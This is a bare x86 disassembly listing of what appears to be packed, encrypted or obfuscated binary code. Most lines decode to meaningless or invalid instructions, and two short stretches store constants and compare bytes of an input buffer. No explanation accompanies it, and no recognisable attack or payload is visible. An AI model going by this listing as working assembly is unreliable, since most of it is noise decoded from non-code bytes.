  41421d:	rcl    DWORD PTR [eax+eiz*1-0x74],0xcc
  414222:	shr    bl,0x5e
  414225:	adc    edx,DWORD PTR [esi-0x803fe8]
  41422b:	int    0xbb
  41422d:	xchg   ebx,eax
  41422e:	inc    esp
  41422f:	ror    BYTE PTR [edx],0x1f
  414232:	fmul   QWORD PTR [ecx+0x7ebb7796]
  414238:	clc    
  414239:	popa   
  41423a:	sub    al,0x10
  41423c:	(bad)  
  41423e:	lock add DWORD PTR [edx-0x2ba379f8],ebx
  414245:	lods   al,BYTE PTR ds:[esi]
  414246:	cmp    al,BYTE PTR [eax+0x4d]
  414249:	add    edi,DWORD PTR [esi-0x4a67f9e]
  41424f:	adc    eax,0x38932e4a
  414254:	aad    0x7d
  414256:	aaa    
  414257:	pop    ebp
  414258:	inc    ecx
  414259:	push   cs
  41425a:	leave  
  41425b:	inc    edi
  41425c:	pop    es
  41425d:	outs   dx,BYTE PTR ds:[esi]
  41425e:	lods   ax,WORD PTR ds:[esi]
  414260:	(bad)  
  414261:	push   ecx
  414262:	pop    es
  414263:	jnp    0x4142a6
  414265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414266:	lds    esp,FWORD PTR [ecx-0xe]
  414269:	push   ecx
  41426a:	and    edx,DWORD PTR [esi]
  41426c:	inc    esp
  41426d:	sub    DWORD PTR [ecx-0x23fb146c],esp
  414273:	inc    ebx
  414274:	in     al,0xdd
  414276:	sbb    DWORD PTR [eax+0x2e],esp
  414279:	mov    ecx,DWORD PTR [ebx]
  41427b:	lods   al,BYTE PTR ds:[esi]
  41427c:	mov    edx,DWORD PTR [esi+0x419a9adc]
  414282:	push   ebp
  414283:	or     esi,edi
  414285:	mov    al,ds:0x98adcc5c
  41428a:	les    ebp,FWORD PTR [ebp-0x289a351b]
  414290:	in     al,dx
  414291:	call   0x594dae6c
  414296:	scas   eax,DWORD PTR es:[edi]
  414297:	xchg   ebx,eax
  414298:	je     0x414225
  41429a:	lock jg 0x4142af
  41429d:	adc    edx,DWORD PTR [ecx]
  41429f:	cmp    BYTE PTR [eax+0x34a301ac],bl
  4142a5:	mul    BYTE PTR [edi-0x5d]
  4142a8:	and    dh,BYTE PTR [ecx]
  4142aa:	push   edx
  4142ab:	jne    0x4142b5
  4142ad:	jb     0x4142fc
  4142af:	fdiv   st(2),st
  4142b1:	fcom   QWORD PTR [ebx]
  4142b3:	and    BYTE PTR [edx],0xb2
  4142b6:	mov    cl,bl
  4142b8:	sbb    al,0xb7
  4142ba:	pop    DWORD PTR [edi+esi*8+0x37]
  4142be:	lock and bl,BYTE PTR [eax-0x5b02a3e7]
  4142c5:	mov    ds:0x46ded17f,eax
  4142ca:	add    al,0xba
  4142cc:	mov    dl,0xfe
  4142ce:	mov    edx,0xa0b41769
  4142d3:	push   esi
  4142d4:	pusha  
  4142d5:	xchg   edi,eax
  4142d6:	stos   DWORD PTR es:[edi],eax
  4142d7:	or     ecx,DWORD PTR [edx]
  4142d9:	push   ss
  4142da:	mov    ds:0x972248df,al
  4142df:	or     eax,0x78c2ba44
  4142e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e5:	jl     0x41435d
  4142e7:	js     0x4142a6
  4142e9:	setae  BYTE PTR [ecx+0x5b]
  4142ed:	mov    ds:0x9a5d05d8,eax
  4142f2:	retf   
  4142f3:	out    dx,al
  4142f4:	mov    WORD PTR ds:0xc7d94535,ss
  4142fa:	pop    ds
  4142fb:	out    dx,al
  4142fc:	ins    BYTE PTR es:[edi],dx
  4142fd:	jnp    0x41431a
  4142ff:	mov    esp,DWORD PTR [edx-0x222fbca2]
  414305:	daa    
  414306:	jno    0x4142cd
  414308:	add    BYTE PTR ds:0xa3126ed7,ch
  41430e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41430f:	fiadd  WORD PTR [eax+edx*4+0x30]
  414313:	gs and al,0xab
  414316:	cmc    
  414317:	mov    eax,ds:0xe1b9fda7
  41431c:	call   0xfdbe:0x2bfadd80
  414323:	add    ebp,edx
  414325:	lahf   
  414326:	inc    ebx
  414327:	(bad)  
  414328:	cmc    
  414329:	pop    es
  41432a:	xchg   esp,eax
  41432b:	lock nop
  41432d:	inc    ecx
  41432e:	rcr    BYTE PTR [ebx+0x3f],0x83
  414332:	mov    bh,BYTE PTR [edi]
  414334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414335:	mov    edi,0xde507262
  41433a:	and    eax,0xdb7f6623
  41433f:	fidivr WORD PTR [esi]
  414341:	xchg   ebx,eax
  414342:	xor    esp,DWORD PTR [ebx+eax*8+0x20]
  414346:	es mov ecx,0xa80b59a4
  41434c:	mov    esi,fs
  41434e:	pop    edi
  41434f:	fisub  WORD PTR [ebx+ebx*1-0x18]
  414353:	jl     0x414349
  414355:	push   edi
  414356:	ret    
  414357:	pushf  
  414358:	push   edi
  414359:	lahf   
  41435a:	loop   0x4143d5
  41435c:	je     0x4143a2
  41435e:	retf   0xd16b
  414361:	cld    
  414362:	mov    WORD PTR ds:0x996e9f12,fs
  414368:	cdq    
  414369:	mov    ds:0x2f5e4fe9,al
  41436e:	jb     0x414399
  414370:	in     eax,dx
  414371:	popf   
  414372:	mov    esi,0x9bbc8ff8
  414377:	sub    DWORD PTR [eax+0x2e5caccc],eax
  41437d:	mov    bl,0x70
  41437f:	sbb    eax,0xccb3c281
  414384:	xchg   ebx,eax
  414385:	add    BYTE PTR [edx-0x75],ch
  414388:	test   BYTE PTR [eax],bl
  41438a:	ror    DWORD PTR [edx+0x22],cl
  41438d:	arpl   WORD PTR [edx+ebx*1],bx
  414390:	loop   0x414386
  414392:	mov    WORD PTR [esi],ss
  414394:	dec    eax
  414395:	aas    
  414396:	dec    esi
  414397:	into   
  414398:	lods   al,BYTE PTR ds:[esi]
  414399:	adc    eax,0xaa2e249
  41439e:	dec    ebp
  41439f:	(bad)  
  4143a0:	xchg   esi,eax
  4143a1:	aad    0xba
  4143a3:	jmp    0x196ef25e
  4143a8:	mov    eax,0x241a32f2
  4143ad:	test   al,0x24
  4143af:	stc    
  4143b0:	add    eax,0xb39c5a3d
  4143b5:	jecxz  0x414407
  4143b7:	dec    edi
  4143b8:	scas   eax,DWORD PTR es:[edi]
  4143b9:	popa   
  4143ba:	outs   dx,BYTE PTR ds:[esi]
  4143bb:	xchg   esp,eax
  4143bc:	cmc    
  4143bd:	pop    es
  4143be:	stos   DWORD PTR es:[edi],eax
  4143bf:	aaa    
  4143c0:	icebp  
  4143c1:	sbb    ebx,DWORD PTR [edi+0x1185a55b]
  4143c7:	(bad)  
  4143c8:	xor    al,0xc7
  4143ca:	or     eax,0x7466cab
  4143cf:	mov    ecx,0xa09efee7
  4143d4:	sub    BYTE PTR [ebx],dl
  4143d6:	(bad)  
  4143d7:	sbb    al,0xfd
  4143d9:	adc    dl,al
  4143db:	out    0xce,al
  4143dd:	mov    edi,0x21a4814a
  4143e2:	mov    bl,0x7b
  4143e4:	cmp    ebp,DWORD PTR [edi-0x3c94a013]
  4143ea:	retf   
  4143eb:	stos   DWORD PTR es:[edi],eax
  4143ec:	fimul  WORD PTR [ebp+0x271a8f69]
  4143f2:	call   0xa15b24f8
  4143f7:	add    edi,DWORD PTR [edi+0x3d]
  4143fa:	test   eax,0x78b8e153
  4143ff:	(bad)  
  414400:	outs   dx,DWORD PTR ds:[esi]
  414401:	loopne 0x4143ed
  414403:	pushf  
  414404:	test   esp,edi
  414406:	iret   
  414407:	jg     0x4143a9
  414409:	test   dl,al
  41440b:	jne    0x414457
  41440d:	outs   dx,DWORD PTR ds:[esi]
  41440e:	mov    dh,0xc3
  414410:	adc    bh,BYTE PTR [edx+0x5ed0369e]
  414416:	cmp    BYTE PTR [edx],0xae
  414419:	sbb    ebx,eax
  41441b:	lea    edx,[eax+0x7c]
  41441e:	dec    eax
  41441f:	jp     0x4143b8
  414421:	scas   eax,DWORD PTR es:[edi]
  414422:	and    al,0xa2
  414424:	push   edx
  414425:	xchg   ebx,eax
  414426:	mov    eax,0x4ccdf185
  41442b:	(bad)  
  41442c:	pushf  
  41442d:	or     eax,0xb144d373
  414432:	xchg   edx,eax
  414433:	jecxz  0x4143fc
  414435:	and    cl,BYTE PTR [ecx+0x44e6214e]
  41443b:	xchg   ebp,eax
  41443c:	pop    esi
  41443d:	test   BYTE PTR [esi+0x72396821],ch
  414443:	fimul  DWORD PTR [esi-0x487a9ce1]
  414449:	aam    0x6d
  41444b:	dec    edi
  41444c:	and    al,0x21
  41444e:	sub    al,0x3a
  414450:	test   BYTE PTR [ebx-0x44c4fa4f],0x9e
  414457:	jns    0x41446b
  414459:	retf   
  41445a:	adc    al,0xf1
  41445c:	mov    ebp,0x9a817ba7
  414461:	ss jno 0x41443f
  414464:	stos   BYTE PTR es:[edi],al
  414465:	repnz sub eax,0x18d632c3
  41446b:	or     al,0x24
  41446d:	jge    0x41441c
  41446f:	aas    
  414470:	pusha  
  414471:	repz push esp
  414473:	jae    0x41442a
  414475:	sub    eax,0xa7e33837
  41447a:	std    
  41447b:	iret   
  41447c:	fdivrp st(3),st
  41447e:	push   es
  41447f:	adc    DWORD PTR [esi],edx
  414481:	xor    DWORD PTR [edi-0x68f841f8],ebp
  414487:	cld    
  414488:	pop    esi
  414489:	lock mov esi,0xb3a985e8
  41448f:	dec    edi
  414490:	(bad)  
  414491:	rol    BYTE PTR [esi-0x17822c30],1
  414497:	call   0xa555:0x1637ed92
  41449e:	iret   
  41449f:	jl     0x414515
  4144a1:	mov    BYTE PTR [ebx+0x4f6e957b],ah
  4144a7:	cwde   
  4144a8:	into   
  4144a9:	jecxz  0x4144b0
  4144ab:	sub    al,BYTE PTR [ecx+0x6c38d938]
  4144b1:	fnsave [edx-0x67]
  4144b4:	adc    al,0x98
  4144b6:	dec    edi
  4144b7:	jp     0x4144e7
  4144b9:	stos   DWORD PTR es:[edi],eax
  4144ba:	adc    al,0x85
  4144bc:	outs   dx,DWORD PTR ds:[esi]
  4144bd:	pop    ebx
  4144be:	out    dx,eax
  4144bf:	mov    ds:0x67987241,al
  4144c4:	mov    ds:0xbc28ab4d,eax
  4144c9:	cs test al,0x3
  4144cc:	test   DWORD PTR cs:[edx+0x40],esp
  4144d0:	cmp    al,0x93
  4144d2:	sub    dh,bh
  4144d4:	enter  0x2ae5,0x2b
  4144d8:	stc    
  4144d9:	add    bh,bh
  4144db:	ret    
  4144dc:	repnz ins BYTE PTR es:[edi],dx
  4144de:	imul   edi,ebx,0x44776aad
  4144e4:	mov    ch,0x64
  4144e6:	add    ecx,DWORD PTR [edx-0x732571b3]
  4144ec:	cmp    BYTE PTR [ebp-0x58],ch
  4144ef:	iret   
  4144f0:	pop    ecx
  4144f1:	es pop ebp
  4144f3:	in     al,dx
  4144f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144f5:	imul   esp,DWORD PTR [ecx],0x74
  4144f8:	jg     0x4144e2
  4144fa:	sub    eax,0xd8c4f9d
  4144ff:	imul   ecx,DWORD PTR [ecx+0x6],0xfffffffb
  414503:	mov    cl,0xff
  414505:	les    edx,FWORD PTR [ecx]
  414507:	aad    0xc8
  414509:	div    BYTE PTR [edi+eax*8+0x45]
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x47c:0x73623c4c
  414595:	ss jno 0x414548
  414598:	shl    BYTE PTR [eax+ebx*1],cl
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [ecx],dl
  4145a1:	outs   dx,DWORD PTR gs:[esi]
  4145a3:	das    
  4145a4:	lds    eax,FWORD PTR [ecx-0x3589812c]
  4145aa:	outs   dx,DWORD PTR ds:[esi]
  4145ab:	cmp    bh,BYTE PTR [eax]
  4145ad:	pop    ds
  4145ae:	je     0x41457e
  4145b0:	stc    
  4145b1:	jnp    0x414542
  4145b3:	ins    BYTE PTR es:[edi],dx
  4145b4:	aad    0xc3
  4145b6:	mov    DWORD PTR [eax-0x5f],eax
  4145b9:	in     eax,dx
  4145ba:	je     0x4145f3
  4145bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145bd:	outs   dx,DWORD PTR ds:[esi]
  4145be:	imul   ebp,DWORD PTR [ebp+eiz*1-0x66],0xa6bd2232
  4145c6:	pop    ebp
  4145c7:	mov    ch,ch
  4145c9:	jmp    ebp
  4145cb:	mov    eax,0x634af6e6
  4145d0:	sti    
  4145d1:	cmc    
  4145d2:	xor    BYTE PTR [edi+edx*2],ah
  4145d5:	js     0x414582
  4145d7:	(bad)  
  4145d8:	imul   edx,DWORD PTR [edx+0x56],0x7d
  4145dc:	sbb    DWORD PTR [ecx],ecx
  4145de:	cmp    DWORD PTR [ebx],0x10
  4145e1:	aam    0x14
  4145e3:	lds    esi,FWORD PTR [ebx-0x5]
  4145e6:	dec    edx
  4145e7:	inc    edi
  4145e8:	stos   BYTE PTR es:[edi],al
  4145e9:	sub    eax,0xb11efe9
  4145ee:	and    ah,ch
  4145f0:	pop    esi
  4145f1:	sbb    BYTE PTR [eax-0x1e],ah
  4145f4:	dec    ecx
  4145f5:	xchg   ebp,eax
  4145f6:	pop    edx
  4145f7:	pop    ebp
  4145f8:	mov    al,ds:0x656d04ea
  4145fd:	bound  ecx,QWORD PTR [ebp-0x3148619a]
  414603:	push   ebp
  414604:	jae    0x41462a
  414606:	out    dx,al
  414607:	ror    DWORD PTR [ecx+0x10],cl
  41460a:	push   cs
  41460b:	push   edx
  41460c:	sahf   
  41460d:	cld    
  41460e:	or     ah,ch
  414610:	xor    DWORD PTR [eax+ebx*1],edi
  414613:	adc    DWORD PTR [ecx+0x7db44ea],ecx
  414619:	outs   dx,BYTE PTR ds:[esi]
  41461a:	dec    esp
  41461b:	cdq    
  41461c:	inc    esi
  41461d:	sub    al,0x44
  41461f:	loopne 0x414647
  414621:	mov    ds:0x8655a04c,al
  414626:	aad    0x6c
  414628:	push   cs
  414629:	scas   al,BYTE PTR es:[edi]
  41462a:	shl    ah,cl
  41462c:	mov    DWORD PTR [ecx],eax
  41462e:	cdq    
  41462f:	adc    eax,DWORD PTR [edi-0xe]
  414632:	mov    WORD PTR [ebp-0x35],?
  414635:	cli    
  414636:	push   es
  414637:	test   eax,0xa6fe6bd7
  41463c:	push   ebx
  41463d:	add    DWORD PTR [ecx-0x80],edx
  414640:	push   edi
  414641:	arpl   WORD PTR [ebp+0x71],di
  414644:	cmc    
  414645:	jno    0x4145d7
  414647:	sbb    ebp,ebx
  414649:	popa   
  41464a:	jbe    0x4146bc
  41464c:	dec    ebx
  41464d:	fisub  WORD PTR [ecx-0x62]
  414650:	rcl    BYTE PTR [eax-0x71],cl
  414653:	and    eax,0xcf89cb1b
  414658:	mov    gs,WORD PTR [esp+edi*1-0x2e]
  41465c:	sbb    al,0xd5
  41465e:	test   esp,ebx
  414660:	imul   ebp,DWORD PTR [edx+0x8b2859a],0x4b
  414667:	jle    0x41467c
  414669:	ins    DWORD PTR es:[edi],dx
  41466a:	rcl    DWORD PTR [esi+0x668c4a67],cl
  414670:	clc    
  414671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414672:	aas    
  414673:	nop
  414674:	je     0x4146b1
  414676:	cld    
  414677:	rol    eax,cl
  414679:	out    0x5e,al
  41467b:	pusha  
  41467c:	jbe    0x41462a
  41467e:	not    DWORD PTR gs:[edx+0x75af8b94]
  414685:	sbb    eax,0xe7318dd3
  41468a:	pop    ebx
  41468b:	out    0x97,al
  41468d:	jmp    0x414701
  41468f:	fiadd  WORD PTR [eax+0x42]
  414692:	push   ebx
  414693:	stc    
  414694:	add    al,0x88
  414696:	retf   0x6139
  414699:	sbb    BYTE PTR [ebx-0x7780323a],dl
  41469f:	leave  
  4146a0:	jge    0x41468d
  4146a2:	xchg   BYTE PTR [edi+0x3],dl
  4146a5:	pop    ebx
  4146a6:	out    0x5c,al
  4146a8:	addr16 mov ah,0xbf
  4146ab:	pop    es
  4146ac:	sub    eax,0xfd38453d
  4146b1:	push   ecx
  4146b2:	out    0xb0,eax
  4146b4:	mov    bl,0xfd
  4146b6:	or     BYTE PTR [ebp-0x45],0xdf
  4146ba:	jmp    0x414700
  4146bc:	hlt    
  4146bd:	mov    ds:0xbd0b844c,eax
  4146c2:	push   0x31
  4146c4:	mov    esp,0x55fa6f31
  4146c9:	or     ebp,DWORD PTR [eax-0x40853fc7]
  4146cf:	and    DWORD PTR [ebp+0xb],edi
  4146d2:	xor    ch,BYTE PTR [edx]
  4146d4:	mov    cl,0x37
  4146d6:	fs push 0xffffff9c
  4146d9:	mov    bl,0x84
  4146db:	out    dx,eax
  4146dc:	(bad)  
  4146dd:	(bad)
  4146e0:	inc    esp
  4146e1:	dec    ebx
  4146e2:	pop    eax
  4146e3:	inc    ebp
  4146e4:	shl    edx,1
  4146e6:	push   eax
  4146e7:	jno    0x41475b
  4146e9:	inc    ebx
  4146ea:	inc    esp
  4146eb:	clc    
  4146ec:	mov    ebx,0x9977e15d
  4146f1:	mov    al,0x96
  4146f3:	mov    BYTE PTR [esi+0x72abba3d],ch
  4146f9:	inc    eax
  4146fa:	xchg   ebx,eax
  4146fb:	xchg   edi,eax
  4146fc:	xchg   edi,eax
  4146fd:	test   BYTE PTR [ecx],dl
  4146ff:	jb     0x4146f0
  414701:	adc    eax,eax
  414703:	test   BYTE PTR [esi-0x5ad210e2],0xe2
  41470a:	pop    esi
  41470b:	mov    eax,ds:0x66d16cc
  414710:	mov    ch,0x84
  414712:	adc    al,0x24
  414714:	enter  0xd910,0x6e
  414718:	call   0x28c6:0x6f12e941
  41471f:	ret    0x1d05
  414722:	test   al,0x3f
  414724:	scas   al,BYTE PTR es:[edi]
  414725:	sub    ecx,DWORD PTR [esi+ecx*4+0x60]
  414729:	jl     0x414771
  41472b:	sbb    eax,0x471ffb30
  414730:	xor    al,0xd8
  414732:	xor    edi,ecx
  414734:	jmp    0xd8a1f5
  414739:	fcom   st(0)
  41473b:	push   ds
  41473c:	sub    DWORD PTR [edx+0x539ee6f4],0xfffffffd
  414743:	mov    bh,0x62
  414745:	fbld   TBYTE PTR [eax+0x1355af43]
  41474b:	loop   0x414714
  41474d:	sub    eax,0xd72eb4b8
  414752:	sahf   
  414753:	jp     0x4146e9
  414755:	push   esp
  414756:	call   0x28fc057c
  41475b:	and    DWORD PTR [ecx+0x76],edx
  41475e:	loop   0x4147c1
  414760:	sbb    eax,DWORD PTR [ecx+0x2e3cbeef]
  414766:	xor    BYTE PTR [eax+0x3a0b3512],dh
  41476c:	pop    ss
  41476d:	clc    
  41476e:	dec    ebx
  41476f:	add    edi,esi
  414771:	mov    dh,0x62
  414773:	aaa    
  414774:	sub    ebp,DWORD PTR [esi+0x5d9ebffd]
  41477a:	inc    edi
  41477b:	fsub   QWORD PTR [edx+edi*1]
  41477e:	pop    ds
  41477f:	and    al,0xd7
  414781:	stc    
  414782:	jno    0x414786
  414784:	nop
  414785:	mov    DWORD PTR [esi+ebx*2-0x23],ecx
  414789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478a:	add    ebp,DWORD PTR [ecx+0x28]
  41478d:	pushf  
  41478e:	adc    BYTE PTR [edx+0x37544460],bh
  414794:	inc    edx
  414795:	dec    edx
  414796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414797:	mov    dl,0x0
  414799:	adc    ah,ch
  41479b:	push   0xffffffae
  41479d:	sub    DWORD PTR [ecx+0x5],esi
  4147a0:	(bad)
  4147a3:	aaa    
  4147a4:	push   edx
  4147a5:	(bad)  
  4147a6:	dec    edx
  4147a7:	jns    0x414774
  4147a9:	inc    esi
  4147aa:	push   0x8a03a719
  4147af:	(bad)  
  4147b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b1:	jmp    0xc37ea0ec
  4147b6:	dec    esi
  4147b7:	mov    ah,0x47
  4147b9:	enter  0xe583,0xbf
  4147bd:	xor    dh,BYTE PTR [eax-0x7cf59f20]
  4147c3:	push   DWORD PTR [esi-0x23f71e94]
  4147c9:	(bad)  
  4147ca:	mov    ebp,edx
  4147cc:	sub    edx,edi
  4147ce:	mov    al,ds:0xb5f5cc21
  4147d3:	xchg   ebx,eax
  4147d4:	sbb    eax,0xeb6545a4
  4147d9:	inc    eax
  4147da:	(bad)  
  4147db:	lock gs pop ebp
  4147de:	or     edi,DWORD PTR [ebx+eax*1+0x33]
  4147e2:	jg     0x414849
  4147e4:	or     edi,esi
  4147e6:	sti    
  4147e7:	adc    ebx,DWORD PTR [edi-0x4a]
  4147ea:	xchg   BYTE PTR [eax+0x7748ea96],dl
  4147f0:	retf   
  4147f1:	add    DWORD PTR [edx],ebx
  4147f3:	enter  0x46dd,0xd8
  4147f7:	mov    ebx,DWORD PTR [ebx-0x4c0dbc45]
  4147fd:	das    
  4147fe:	or     ecx,DWORD PTR [edi]
  414800:	xor    ecx,DWORD PTR [ecx]
  414802:	dec    edx
  414803:	mov    ds:0xe8729159,al
  414808:	jmp    0xa7d5:0x6bbb8c91
  41480f:	fwait
  414810:	mov    al,ds:0x73ca52b6
  414815:	cmp    ebx,esp
  414817:	jae    0x4147d9
  414819:	sahf   
  41481a:	push   ebx
  41481b:	xchg   esi,eax
  41481c:	aas    
  41481d:	mov    BYTE PTR ds:[esi+eiz*2+0x26eb9ed1],bh
  414825:	pop    edx
  414826:	mov    al,ds:0x7737df0a
  41482b:	sbb    DWORD PTR [edi],0xffffff8d
  41482e:	(bad)
  414831:	sbb    eax,0x456aab55
  414836:	mov    bl,0x6f
  414838:	enter  0x9cc0,0xe2
  41483c:	sub    eax,0xd15c99c6
  414841:	inc    ecx
  414842:	mov    ebx,0xecb03e3a
  414847:	push   ecx
  414848:	jl     0x414826
  41484a:	sbb    edx,DWORD PTR ds:0xf6e8616e
  414850:	cld    
  414851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414852:	test   DWORD PTR [edx],ecx
  414854:	jne    0x41486e
  414856:	sbb    BYTE PTR [edi*8+0x11489661],0x4
  41485e:	cmp    dh,BYTE PTR [bp+di]
  414861:	adc    DWORD PTR [ecx-0x5d],edi
  414864:	int3   
  414865:	cmp    dl,cl
  414867:	sub    eax,0x6068ae9b
  41486c:	in     al,dx
  41486d:	mov    cl,0xa5
  41486f:	push   ebx
  414870:	jne    0x4147fd
  414872:	or     esi,eax
  414874:	out    0xab,al
  414876:	push   eax
  414877:	(bad)  
  414878:	jbe    0x414883
  41487a:	je     0x414875
  41487c:	mov    ebp,0xa6b25e1e
  414881:	ins    BYTE PTR es:[edi],dx
  414882:	mov    ebx,0xaac0272a
  414887:	sar    cl,cl
  414889:	pop    ebx
  41488a:	mov    BYTE PTR [esi-0xf],0x55
  41488e:	jb     0x4148ba
  414890:	ds in  al,dx
  414892:	shl    BYTE PTR [ebx-0x44ba05a3],0x9f
  414899:	pop    eax
  41489a:	cmp    dl,cl
  41489c:	fidivr WORD PTR [edx+0x6bb44124]
  4148a2:	cmp    DWORD PTR [ebx],edi
  4148a4:	jmp    0xc775:0x6b0ca803
  4148ab:	sbb    DWORD PTR [edi+0x12],edi
  4148ae:	fistp  WORD PTR [esi+0x5df02141]
  4148b4:	(bad)  
  4148b5:	xchg   esi,eax
  4148b6:	in     al,dx
  4148b7:	xor    eax,ecx
  4148b9:	clc    
  4148ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148bb:	lock and eax,0x7f900409
  4148c1:	push   ecx
  4148c2:	push   ebp
  4148c3:	call   0x6956:0x457b80ee
  4148ca:	in     eax,dx
  4148cb:	jmp    0xd15c:0xdacb00e9
  4148d2:	(bad)  
  4148d3:	sbb    bl,BYTE PTR [edi]
  4148d5:	mov    DWORD PTR [ebp+0xa2e54c2],ebx
  4148db:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4148dd:	inc    eax
  4148de:	add    DWORD PTR [edi],ebx
  4148e0:	jl     0x4148ce
  4148e2:	leave  
  4148e3:	jbe    0x414899
  4148e5:	xchg   esp,eax
  4148e6:	nop
  4148e7:	(bad)  
  4148e8:	adc    ebx,DWORD PTR [ecx]
  4148ea:	test   al,0x3b
  4148ec:	retf   
  4148ed:	cs sahf 
  4148ef:	retf   0x6ca2
  4148f2:	cdq    
  4148f3:	xor    BYTE PTR [esi],al
  4148f5:	push   esp
  4148f6:	mov    ds:0x2f608f87,eax
  4148fb:	mov    ebp,0x25a7dc10
  414900:	(bad)  
  414901:	sub    ebp,DWORD PTR [ebp-0x6d]
  414904:	dec    esi
  414905:	(bad)  
  414906:	pop    ebx
  414907:	add    dh,bh
  414909:	into   
  41490a:	lods   eax,DWORD PTR ds:[esi]
  41490b:	xor    esp,DWORD PTR [eax]
  41490d:	loope  0x4148a8
  41490f:	(bad)  
  414910:	cmp    cl,BYTE PTR [esi+0x363b43ca]
  414916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414917:	jge    0x414987
  414919:	sub    BYTE PTR [edx+0x51dcb54a],bh
  41491f:	mov    WORD PTR [ebp+0x52af81ad],cs
  414925:	repz mov ds:0xe3ef6e9e,al
  41492b:	and    dh,ah
  41492d:	pop    ecx
  41492e:	es jmp 0x4148ea
  414931:	fdiv   DWORD PTR [ebx]
  414933:	sti    
  414934:	push   0x775edcd7
  414939:	dec    ebp
  41493a:	jmp    0x3a0a2532
  41493f:	jg     0x41498c
  414941:	pop    ds
  414942:	fnstenv [edi+ebx*1-0x45]
  414946:	fadd   QWORD PTR [ebx-0x75]
  414949:	dec    ebp
  41494a:	cld    
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x64
  414996:	inc    ebx
  414997:	daa    
  414998:	stos   BYTE PTR es:[edi],al
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [eax+0xf2752b7],dl
  4149a6:	outs   dx,BYTE PTR ds:[esi]
  4149a7:	cmc    
  4149a8:	sbb    eax,0x33ca3b67
  4149ad:	push   es
  4149ae:	and    ah,bh
  4149b0:	and    ebp,DWORD PTR [esi-0x6]
  4149b3:	shr    ch,0x3f
  4149b6:	das    
  4149b7:	and    esi,DWORD PTR [edi-0x75a030c0]
  4149bd:	xor    ebx,esi
  4149bf:	push   ds
  4149c0:	cld    
  4149c1:	push   edi
  4149c2:	sbb    ebx,DWORD PTR ss:[ecx+ecx*2-0x6aa68f24]
  4149ca:	dec    ebx
  4149cb:	je     0x4149f9
  4149cd:	data16 and BYTE PTR [edx+0x77],dh
  4149d1:	jb     0x414a49
  4149d3:	mov    al,0xee
  4149d5:	sar    BYTE PTR [bx],cl
  4149d8:	call   0xc2781479
  4149dd:	inc    ecx
  4149de:	mov    esp,0x3446654e
  4149e3:	dec    edx
  4149e4:	or     eax,0x2fbab8be
  4149e9:	fwait
  4149ea:	mov    edx,0x5fd5a90e
  4149ef:	cwde   
  4149f0:	mov    ss,WORD PTR [eax]
  4149f2:	leave  
  4149f3:	(bad)  
  4149f4:	mov    esi,0xb1f1d8d
  4149f9:	dec    esp
  4149fa:	aam    0xa5
  4149fc:	icebp  
  4149fd:	or     al,ch
  4149ff:	and    ecx,DWORD PTR [eax+esi*8+0x6e76f0da]
  414a06:	inc    edi
  414a07:	test   al,0x2b
  414a09:	cmp    al,0x98
  414a0b:	aas    
  414a0c:	loop   0x414a47
  414a0e:	fld    st(5)
  414a10:	inc    ebp
  414a11:	rol    esi,0xcf
